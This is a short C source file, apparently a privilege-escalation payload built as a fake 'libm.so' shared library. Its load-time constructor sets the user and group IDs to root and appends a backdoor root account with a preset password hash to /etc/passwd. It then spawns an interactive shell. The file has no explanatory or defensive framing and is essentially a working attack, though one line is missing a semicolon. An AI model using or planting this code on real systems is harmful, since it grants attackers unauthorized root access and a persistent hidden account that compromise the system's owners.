// gcc -shared -fPIC -o libm.so root.c

#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void bad_stuff() {
        setuid(0);
        setgid(0);
        system("echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd")
        system("/bin/sh -i");
}